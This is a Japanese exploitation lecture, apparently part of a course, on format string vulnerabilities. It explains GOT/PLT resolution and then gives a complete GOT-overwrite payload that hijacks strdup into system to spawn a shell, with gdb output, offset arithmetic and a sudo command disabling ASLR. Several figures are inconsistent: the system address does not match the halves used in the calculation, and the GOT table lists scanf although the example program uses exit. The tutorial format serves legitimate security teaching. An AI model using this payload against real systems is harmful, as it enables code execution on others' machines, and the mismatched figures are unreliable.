# フォーマット文字列脆弱性 2

先に進む前に、次のものを無効にしてください。
1. ASLR : `echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space`.
2. Libc のランダム化 : `ulimit -s unlimited`.

前の講義で扱った、任意のメモリ書き込みの考え方を引き続き使います。まだ読んでいなければ、先に進む前にそちらを読んでください。[Lecture 5](../Lecture5/README.md)

前の講義では、フォーマット文字列脆弱性で任意のメモリ書き込みを行う方法を見ました。この講義では、その脆弱性を利用して、シェルを起動する方法を見ます。冗談ではありません。これらの脆弱性は、シェルの起動にまで拡大できます。

この脆弱性を深く exploit する前に、exploit に必要な話題をいくつか取り上げます。

### 1. GOT
Global offset table (GOT) は、プログラムが外部のライブラリを呼び出していて、その外部ライブラリが動的にリンクされているときに登場します。
動的リンクについて詳しくは、[こちら](https://en.wikipedia.org/wiki/Dynamic_linker)を参照してください。動的リンクはバイナリのサイズを小さくしますが、動的リンクに伴う実行時の複雑さを増やし、GOT の exploit を行う道も開きます。
Global offset table (GOT) は、関数呼び出しの実際のアドレスを、本物のテーブルの形で保存します。ただし、このテーブル自体は動的リンカ(dynamic linker)が作ります。リンカがこの GOT のエントリをどう埋めるかを定めた、実行の流れがあります。
次のプログラムを考えます。

```C
int main()
{
    printf("Hello");
    exit(1);
}
```

実際の `printf` と `scanf` は、メモリ上のあるアドレスにあります(バイナリは起動時にそのアドレスを知りません)。コンパイラは、これらの外部関数のアドレスを保存するテーブルをメモリ上に作ります。ここで注意すべき点は、共有ライブラリには `print`、`scanf`、`exit`、`system` などすべての関数が含まれますが、GOT テーブルには、プログラムが使う `printf` と `exit` のエントリだけが入ることです。
この GOT は次のようになります。

| Name     | Address   |
|----------|-----------|
| `printf` | UNDEFINED |
| `scanf`  | UNDEFINED |

見てのとおり、GOT テーブルを作る時点でのアドレスは `UNDEFINED` です。プログラムがメモリに読み込まれたとき、プログラムは、呼び出しに必要な共有ライブラリの正確な位置を知りません。共有ライブラリのコードは、メモリ上のあるアドレスにありますが、そのアドレスはコンパイル時にはコンパイラにもわかりません。そこでコンパイラは、動的リンカ、または GOT にある関数のアドレスを呼び出すためのスタブ(stub)を差し込みます。

#### スタブはどこにあるのか
このディレクトリにあるコンパイル済みバイナリの1つに対して、次のコマンドを実行すると、
`objdump -d ./string`
```
Disassembly of section .plt:

08048360 <printf@plt-0x10>:
 8048360:    ff 35 04 a0 04 08        pushl  0x804a004
 8048366:    ff 25 08 a0 04 08        jmp    *0x804a008
 804836c:    00 00                    add    %al,(%eax)
    ...

08048370 <printf@plt>:
 8048370:    ff 25 0c a0 04 08        jmp    *0x804a00c
 8048376:    68 00 00 00 00           push   $0x0
 804837b:    e9 e0 ff ff ff           jmp    8048360 <_init+0x2c>

08048380 <strdup@plt>:
 8048380:    ff 25 10 a0 04 08        jmp    *0x804a010
 8048386:    68 08 00 00 00           push   $0x8
 804838b:    e9 d0 ff ff ff           jmp    8048360 <_init+0x2c>
```

これを GOT テーブルに書き直して、GOT テーブルがどのように見えるかを確認しましょう。

| Memory address        | Actual address of function |
|-----------------------|----------------------------|
| 0x804a00c -- `printf` | UNDEFINED                  |
| 0x804a010 -- `strdup` | UNDEFINED                  |

メモリアドレス `0x804a00c` には `printf` 関数の実際のアドレスが保存されます。同様に、`strdup` の呼び出し先は `0x804a010` に保存されます。
GOT テーブルを作る時点では、これらは `UNDEFINED` で、objdump では確認できません。これらが最初は空かどうかを確認するには、デバッガを使う必要があります。私はこれに `Hopper` を使っています。

これらの GOT エントリが最初は空だとすると、その文脈を解決するために、誰がこれらのアドレスを埋めるのでしょうか。ここで、動的リンカの呼び出しが登場します。

```
           Disassembly of section .plt:

+--------->08048360 <printf@plt+0x10>:
|           8048360:    ff 35 04 a0 04 08        pushl  0x804a004
|           8048366:    ff 25 08 a0 04 08        jmp    *0x804a008
|           804836c:    00 00                    add    %al,(%eax)
|              ...
|
|          08048370 <printf@plt>:
|           8048370:    ff 25 0c a0 04 08        jmp    *0x804a00c
|           8048376:    68 00 00 00 00           push   $0x0
+<---------+804837b:    e9 e0 ff ff ff           jmp    8048360 <_init+0x2c>   <-------------+  OBSERVE
|
|          08048380 <strdup@plt>:
|           8048380:    ff 25 10 a0 04 08        jmp    *0x804a010
|           8048386:    68 08 00 00 00           push   $0x8
+<---------+804838b:    e9 d0 ff ff ff           jmp    8048360 <_init+0x2c>   <-------------+  OBSERVE

```

`<printf@plt+0x10>` が、動的リンカが登場する場所です。関数呼び出しから制御が流れると GOT に行きますが、最初の呼び出しでは GOT のエントリが空なので、`jmp    *0x804a010` 命令はまったく効果がありません。そのため制御は次の行の `push $0x0, jump 8048360` に進み、後者のジャンプ命令の行き先が、動的リンカのアドレスにほかなりません。そして動的リンカが、呼び出しを解決して GOT のエントリを更新します。以降の呼び出しは、GOT にあるアドレスを使って行われます。


プログラムに GOT があることで、exploit の道がいくつか開けます。たとえば、リンカが `printf` のアドレスを更新する場所である `0x804a00c` に、何か適当なアドレスを書き込めたとします。すると、`printf` が呼ばれたときに、プログラムを私たちの望む場所へ向かわせられます。`system` にしたらどうでしょうか。`printf` が `system` のように動作します。この考え方を **GOT exploitation** と呼びます。


#### 点と点をつなぐ :smiling_imp:
1. フォーマット文字列で任意のアドレスに書き込ませる方法がわかっている。
2. 関数がどう呼び出されるかがわかっている。

```C
#include <stdio.h>
#include <string.h>
// gcc -m32 temp.c でコンパイルする

void foo(char *ch)
{
    char buf[100];
    strncpy(buf, ch, 100);
    printf(buf);
    char *name = strdup(buf);
    printf("\nHello %s", name);
}

int main(int argc, char** argv)
{
    foo(argv[1]);
    return 0;
}

```

`strdup` の GOT エントリを `system` のアドレスで上書きします。すると、`strdup(buf)` が呼ばれたときに `system(buf)` が実行されます。`buf` として `/bin/sh` を入力すれば、`system(/bin/sh"")` によってシェルを exploit できます。

`%n` でアドレスを書き込むのは難しくなります。%n で書き込める数の大きさには限りがあるからです。そこで、一度に **2バイト** を書き込む `%hn` の考え方を使って、アドレスを分割します。

ペイロードを作りましょう。次のような形になります。
``./string `python -c 'import struct; print "sh;#" + struct.pack("<I", <SOME_ADDRESS>) + struct.pack("<I", <SOME_ADDRESS>) +"%<SOME_VALUE>x%11$hn%<SOME_VALUE>x%12$hn"'` ``

**11** と **12** は、`printf` 関数の呼び出しから、私のバッファ `buf` の位置までのオフセットです。あなたの環境では異なる可能性があります。前の講義で説明した考え方に従って求めてください。

これで、`system` 関数のアドレスを2つに分けて書き込む先のオフセットがわかりました。しかし、`%hn` は `printf` で出力された文字数を書き込むので、`len(address(system))` の長さのごみ文字を出力しなければなりません。文字列のサイズには限りがあるので、それもできません。そこで `%x` フォーマット指定子の助けを借ります。`%(n)x` フォーマット指定子は、出力に `(n)` 個の空白を出力しますが、入力文字列のサイズは増やしません。:cool:

最終的なペイロードは次のようになるでしょう。
``./string `python -c 'import struct; print "sh;#" + struct.pack("<I", 0x804a010) + struct.pack("<I", 0x804a012) +"%10948x%11$hn%13068x%12$hn"'` ``
では、私が system のアドレスをどうやって見つけたかを見てみましょう。
```bash
$ gdb ./string
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
62 commands loaded for GDB 7.11.1 using Python engine 3.5
[*] 6 commands could not be loaded, run `gef missing` to know why.
GEF for linux ready, type `gef' to start, `gef config' to configure
62 commands loaded for GDB 7.11.1 using Python engine 3.5
[*] 6 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./string...(no debugging symbols found)...done.
gef➤  b main
Breakpoint 1 at 0x804854f
gef➤  r
Starting program: /vagrant/Lecture6/string

Breakpoint 1, 0x0804854f in main ()

gef➤  p system
$1 = {<text variable, no debug info>} 0x555c2da0 <system>
```

これで `system` のアドレスがわかりました。次に、このアドレスを `%(n)x` のための数に変換する必要があります。これを2つに分けて行います。
```python
>>> 0x2ad0 - 12
10948
>>> 0x555c - 0x2250
13068
```

`python` で計算した、この2つに分けたアドレスが、`%x` の `n` の値になります。

#### 最後に
1. printf からバッファまでのアドレスのオフセットを調べます。
2. バッファの先頭に `sh;#` を加え、その後ろに GOT の関数の位置のアドレスを続けます。
3. このアドレスは2つに分かれます。`GOT の基底アドレス` と `GOT の基底アドレス + 2` です。
4. バッファで指定したアドレスに、2バイトの内容(`system 関数の呼び出しのアドレス`)を書き込みます。
5. exploit を実行してみませんか。:cool:
